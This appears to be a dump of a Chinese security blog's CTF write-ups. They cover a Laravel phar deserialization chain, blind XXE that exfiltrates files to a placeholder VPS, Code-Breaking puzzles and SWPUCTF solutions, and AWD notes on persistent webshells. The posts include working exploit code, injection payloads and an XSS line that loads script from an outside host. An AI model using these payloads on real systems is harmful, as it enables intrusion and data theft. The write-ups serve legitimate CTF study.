function __construct(Dispatcher $events, $event) { $this-&gt;event = $event; $this-&gt;events = $events; } public function __destruct() { $this-&gt;events-&gt;dispatch($this-&gt;event); } }Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。 为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。 所以要找一个有_call方法的类–&gt;类ValidGenerator。 ValidGeneratorpublic function __call($name, $arguments) { $i = 0; do { $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) { throw new \\OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries)); } } while (!call_user_func($this-&gt;validator, $res)); return $res; }$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数 由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类 Generator类public function __call($method, $attributes) { return $this-&gt;format($method, $attributes); }继续跟进format方法 public function format($formatter, $arguments = array()) { return call_user_func_array($this-&gt;getFormatter($formatter), $arguments); }$formatter的值不可控，且初值为dispatch，继续跟进getFormatter() public function getFormatter($formatter) { if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; }在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让$this-&gt;getFormatter($formatter)的值是一个数组，即第一次getFormatter()返回的值是数组。数组只有一个值仍为getFormatter，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。 根据getFormatter方法当参数为空时，返回formatters成员的第一个值。 所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。 回身处理validator那么$this-&gt;validator如何处理呢？ 这里看到师傅们找的了一个跳板类，赋值给了validator phpunit\\phpunit\\src\\Framework\\MockObject\\Stub\\ReturnCallback.php:26 namespace PHPUnit\\Framework\\MockObject\\Stub; class ReturnCallback implements Stub { public function invoke(Invocation $invocation) { return \\call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters()); }invocation接口实现方法getParameters()是接口的一个方法，用来访问私有属性parameters的值 找到调用这个接口的类就行了，这里是 namespace PHPUnit\\Framework\\MockObject\\Invocation; class StaticInvocation implements Invocation, SelfDescribing { private $parameters; }这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了 构建POC思路给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell 总结一下，Invoke的回调函数能getshell的原因有二：1、$this-&gt;callback 反序列化可控2、继承invocation的类名返回值可控(getFormatter实现) Final-EXP看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下 &lt;?php namespace Illuminate\\Broadcasting{ class PendingBroadcast{ function __construct(){ $this-&gt;events = new \\Faker\\ValidGenerator(); $this-&gt;event = &#39;everything&#39;; } } } namespace PHPUnit\\Framework\\MockObject\\Invocation{ class StaticInvocation{ function __construct(){ $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;); } } } namespace PHPUnit\\Framework\\MockObject\\Stub{ class ReturnCallback{ function __construct(){ $this-&gt;callback = &#39;file_put_contents&#39;; } } } namespace Faker{ class ValidGenerator{ function __construct(){ $evilobj = new \\PHPUnit\\Framework\\MockObject\\Invocation\\StaticInvocation(); $g1 = new \\Faker\\Generator(array(&#39;everything&#39; =&gt; $evilobj )); $g2 = new \\Faker\\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;))); $rc = new \\PHPUnit\\Framework\\MockObject\\Stub\\ReturnCallback(); $this-&gt;validator = array($rc, &quot;invoke&quot;); $this-&gt;generator = $g2; $this-&gt;maxRetries = 10000; } } class Generator{ function __construct($form){ $this-&gt;formatters = $form; } } } namespace{ $exp = new Illuminate\\Broadcasting\\PendingBroadcast(); print_r(urlencode(serialize($exp))); // phar $p = new Phar(&#39;./hpdoger.phar&#39;, 0); $p-&gt;startBuffering(); $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;); $p-&gt;setMetadata($exp); $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;); $p-&gt;stopBuffering(); }上传文件，接着进行反序列化 http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif 再次膜前辈师傅们"},{"title":"从两道CTF题目学习XXE漏洞","date":"2019-01-06T16:00:00.000Z","path":"2019/01/07/从两道CTF题目学习XXE漏洞/","text":"从两道CTF题目学习XXE漏洞接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞 XML相关知识什么是XMLXML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。 通俗点来说就是存储数据的一种格式它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素 什么是实体实体有以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体。这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体 内部实体即在xml文档中自定义一个实体格式：&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做实体 外部实体格式：&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入 下面是支持使用的URI 关于外部实体引用file协议的例子如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; &lt;root&gt;&amp;file;&lt;/root&gt;参数实体&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt; 或者 &lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;外部引入参数实体的例子： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name; ]&gt;注意:%name（参数实体）是在DTD中被引用的，而其余实体是在xml文档中被引用的。 什么是DTDW3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 我理解的DTD是构建一个区域，声明在区域中要引入的实体\\元素 内部声明DTD语法：&lt;!DOCTYPE 根元素 [元素声明]&gt; 即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。 其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。 PS：#PCDATA的意思是解析字符数据 外部声明DTD语法：&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;,即引入外部的dtd声明,其中dtd文件就是引入的实体 XXEXXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。 有回显的XXEjarvisoj平台上的题目 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值 35CTF Blind XXE这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器 代码分析代码如下： &lt;?php function __autoload($cls) { include $cls; } class Black { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;); if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;); if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;); if ($store) { setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;); } } } class Green { public function __construct($string, $default, $keyword, $store) { if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;); if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;); if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;); if ($store) { setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;); } } } if ($_=@$_GET[&#39;theme&#39;]) { if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) { if (@class_exists($_)) { ($string = @$_GET[&#39;string&#39;]) || $string = false; ($default = @$_GET[&#39;default&#39;]) || $default = false; ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false; new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]); } } } else if ($_=@$_COOKIE[&#39;theme&#39;]) { $args = explode(&#39;-&#39;, $_); if (class_exists($args[0])) { new $args[0]($args[1], $args[2], $args[3], &#39;&#39;); } } else if ($_=@$_GET[&#39;info&#39;]) { phpinfo(); } highlight_file(__FILE__);关于代码逻辑部分简单说一下： theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。 __autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。 既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用 关于这个类的具体使用介绍：http://php.net/manual/zh/class.simplexmlelement.php 这里仅仅大致用法： 所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。 一开始构造xml的poc花了半天时间，主要踩了两个坑： 1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file &quot;hpdoger&quot;&gt; &lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt; %send; ]&gt;只能引入外部声明DTD才能进行参数实体嵌套使用，但是嵌套使用还必须满足下面的一个条件 2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC POCvps上的xml文件如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt; %send; %test; %back; ]&gt;vps上的外部DTD声明文件test2.dtd如下： &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;用Curl发送请求，–cookie指定请求cookie参数 curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;查看web日志即能看到base64加密的flag 其中： 外部实体send引入外部DTD声明 参数实体test即为“中间参数实体” &#37;为了避免编码问题 base64-encode是防止文件内容有空格导致http传输时被截断 题外话关于FUZZ关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目： TheTwitchy:https://github.com/TheTwitchy/xxer docker快速搭建lnmp+ssh(自己的项目求start:): https://github.com/Hpd0ger/docker-lnmp 关于XXE漏洞挖掘XML作为介质传输流程应该是这样的： 用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断 漏洞点就在后端解析xml。 当后端使用loadXML()的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。 在挖掘漏洞的时候尤其注意两点： content-type: application/xml xml形式的数据传输e.g:&lt;user&gt;admin&lt;/user&gt; 关于防御 对于PHP，禁止引用外部实体 libxml_disable_entity_loader(true); 对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用"},{"title":"Code-Breaking-Puzzles WriteUp","date":"2018-12-20T16:00:00.000Z","path":"2018/12/21/Code-Breaking-Puzzles WriteUp/","text":"Code-Breaking-Puzzles WriteUp最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。 easy - function不得不说P神的代码简洁又暴力 &lt;?php $action = $_GET[&#39;action&#39;] ?? &#39;&#39;; $arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;; if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) { show_source(__FILE__); } else { $action(&#39;&#39;, $arg); }这里??是php7+的用法，$_GET[‘action’]非空则 $action = $_GET[‘action’] 应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。 P神小密圈说到的方式用\\可以绕过。原因就是\\funciton是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\\think\\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似 接着就是调用Create_function函数来代码注入了，具体原理参考：http://blog.51cto.com/lovexm/1743442 直接上Poc:action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));// 别忘了注释//，否则逃脱不了函数 easy - pcrewaf&lt;?php function is_php($data){ return preg_match(&#39;/&lt;\\?.*[(`;?&gt;].*/is&#39;, $data); } if(empty($_FILES)) { die(show_source(__FILE__)); } $user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]); $data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]); if (is_php($data)) { echo &quot;bad request&quot;; } else { @mkdir($user_dir, 0755); $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path); header(&quot;Location: $path&quot;, true, 303); } 逻辑又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件 很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？ PCREPCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库 NFA引擎 **NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**分析NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说 preg_match(&#39;/&lt;\\?.*[(`;?&gt;].*/is&#39;, $data)如果我们输入&lt;?php print;abcd 那么它匹配的流程应该是这样的：&lt;?php print;abc&lt;?php print;ab&lt;?php print;a&lt;?php print;&lt;?php print;abcd .*会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制 引用kk师傅的一张图： 5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false POC既然是弱类型比较，我们就用false来等价null绕过 &lt;?php $f = fopen(&quot;poc.txt&quot;, &quot;w&quot;); $msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000); fwrite($f,$msg); fclose($f);构造个上传表单完事 这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素 phpmagic这个题真的发现很多知识碎片 php://filter首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic 当我们可控的文件名$file传入参数php://filter/write=convert.base64-decode/resource=shell.php，$text传入this is test时，file_put_contents($file,$text)执行的内容如下： 可以把写入的文本进行base64编码，而且可以指定写入的文件名shell.php。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过后端正则对可控文本php危险语句检测的过滤 审计关键代码 $output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。 至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715 poc如下 php limit这道题依然简单粗暴，代码如下 &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) { eval($_GET[&#39;code&#39;]); } else { show_source(__FILE__); }刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配/[^\\W]+\\((?R)?\\)/，看下面这个例子 在匹配完b()之后，由于匹配不到[^\\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值 有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下 Nodejs魔法Koa框架写的登陆页面，入库的语句都写出来了 看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间 继续看到登陆的逻辑传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果 ##分析一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;和&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot; 那么select 和 union 都可以绕过 一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢 有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。 真的是太菜了"},{"title":"SWPUCTF2018 Write up","date":"2018-12-19T16:00:00.000Z","path":"2018/12/20/SWPUCTF2018 Write up/","text":"恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。 SWPUCTF2018MISCPCAP签到题，流量包拖wireshark追TCP包 床前明月光,低头…低头看键盘 99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33键盘密码 99就代表9那列的第二个值 look ….. 依次读就行了 WEB用优惠码买个X拿到题目扫目录 www.zip源码如下 $_SESSION[&#39;seed&#39;]=rand(0,999999999); function youhuima(){ mt_srand($_SESSION[&#39;seed&#39;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&#39;&#39;; $len=15; for ( $i = 0; $i &lt; $len; $i++ ){ if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); } setcookie(&#39;Auth&#39;, $auth); } //support if (preg_match(&quot;/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im&quot;,$ip)){ if (!preg_match(&quot;/\\?|flag|}|cat|echo|\\*/i&quot;,$ip)){ //执行命令 }else { //flag字段和某些字符被过滤! } }else{ // 你的输入不正确! } ?&gt;根据提示应该分两部分 绕过优惠码-&gt;命令执行逃过 首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。 这里mt_srand伪随机，具体机制可以看这篇文章：http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF 种子不变，生成的随机数就不变 所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码 脚本跑随机数在字符串的位置： &lt;?php $str = &quot;lP9DUJjQ&quot;; $randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; for($i=0;$i&lt;strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] } echo &quot;\\n&quot;; ?&gt;这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样 用工具php_mt_seed跑一下 本地php7环境跑这个种子的24位就能得到优惠码了 优惠码成功跳转到命令执行whois查询，匹配ip时用了/m 且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip 过滤了查询flag的语句，用”” 或者\\绕过都行 完整payload: ca\\t /f\\lag%0a127.0.0.1Injection ???扫目录用个info.php 是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了 思路很简单，用通配符猜解admin的密码 username=admin&amp;password[$regex]=^**只不过要写个脚本跑验证码，这里队友写了一个提供参考 import requests import time import pytesseract from PIL import Image import os from urllib.request import urlretrieve j=0 passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;] payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot; url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot; img_url = &#39;http://123.206.213.66:45678/vertify.php&#39; for i in range(1,20): while j&lt;len(payload): s = requests.session() payloads = payload[j] with open(r&#39;C:\\Users\\asus\\Desktop\\image\\img1.png&#39;,&#39;wb&#39;) as fd: img_1 = s.get(url=img_url) fd.write(img_1.content) image = Image.open(r&#39;C:\\Users\\asus\\Desktop\\image\\img1.png&#39;) vcode = pytesseract.image_to_string(image) url_1 = url.format(str(payloads),vcode) r = s.get(url_1,cookies=img_1.cookies) print(r.text) if &quot;wrong CAPTCHA!&quot; in r.text: continue if &quot;username or password incorrect!&quot; in r.text: print(payloads) j = j+1 break if &quot;Nice!But it is not the real passwd&quot; in r.text: passw0rd.append(payloads) print(&quot;passw0rd is :&quot; + str(passw0rd)) j = j+1 breakSimplePHP题目地址： file有个代码高亮的功能，把这些页面的额源码都Down一下 先看一下test类的__get()方法 __get()方法用于输出一个不可访问变量的值，不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。 开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码 public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。 所以只需要想办法使$this-&gt;params[$key] = ‘/var/www/html/f1ag.php’ 瓶颈一开始我是这样构造的攻击链： 之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上 但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法： 正确的思路$a = new Test(); $a-&gt;params = [ &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39; ]; $b = new Show(); $b-&gt;str[&#39;str&#39;] = $a; $c = new C1e4r(); $c-&gt;str = $b;思路就是：我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出 C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象 有趣的邮箱注册网站功能很少：提交邮箱地址-&gt;管理审核邮箱 给了hint: &lt;!--check.php if($_POST[&#39;email&#39;]) { $email = $_POST[&#39;email&#39;]; if(!filter_var($email,FILTER_VALIDATE_EMAIL)){ echo &quot;error email, pleduase check your email&quot;; }else{ echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd echo $email; } } ?&gt; --&gt;之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:https://xz.aliyun.com/t/2501 大致就是单引号双引号重叠，用\\可以绕过空格， 然后我尝试了一下注入scirpt标签提交..尼玛直接成功了… email=&quot;\\ &lt;sCRiPt\\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\\ &quot;@aa.com那它的意思应该是后台管理员会随时点击这个email，就触发了xss 因为打不到管理员的cookie，就打admin.php的页面源码了 发现后台会跳到：/admin/a0a.php?cmd=whoami 明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP 后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令 用XHR发送请求或者Location重定向都可以 反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下 &lt;?phpinclude(&quot;upload.php&quot;); echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;; $sys = &quot;tar -czf z.tar.gz *&quot;; chdir($upload_dir); system($sys); if(file_exists(&#39;z.tar.gz&#39;)){ echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;; echo &quot;备份文件名: z.tar.gz&quot;; }else{ echo &quot;未上传文件，无法备份！&quot;; } ?&gt;也就是说它会备份我们上传目录下的所有文件，即* 上传一些文件名例如| echo &quot;123&quot;&gt;123.php System 就会执行拼接后的$sys 当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。 然后直接给我了flag…2333… 感受这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！"},{"title":"HCTF2018线下赛感想","date":"2018-12-16T16:00:00.000Z","path":"2018/12/17/HCTF2018线下赛感想/","text":"跑去丢了一趟人，实在是对不起各位师傅 反思比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。 这次比赛也算是给自己个教训，准备不充分，就把之前备好的流量成功监控了，其余的东西几乎没用 比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。 其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。 第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来… 所以上线一定要快，备份打的一定要快！ 教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。 所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。最重要的事，不要随便就把目录555了，如果Check点是上传和下载功能就凉了 关于防御，一定要给自己留一个可用的后门,www-data权限一定得有一个，否则php进程可能都杀不掉 这次比赛后要准备的东西吃足了教训：手动上马是非常愚蠢的行为 内置后门批量上马蓝莲花的moxiaoxi师傅的脚本思路大致是这样的： 内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求 最近要完成这个脚本 心态心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。 这次就算是交学费了，自闭"},{"title":"RootkitXSS之ServiceWorker","date":"2018-11-13T16:00:00.000Z","path":"2018/11/14/RootkitXSS֮ServiceWorker/","text":"RootkitXSS之ServiceWorker文章首发于先知：https://xz.aliyun.com/t/3228#toc-10 在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅 Serviceworker定义Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。 也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache 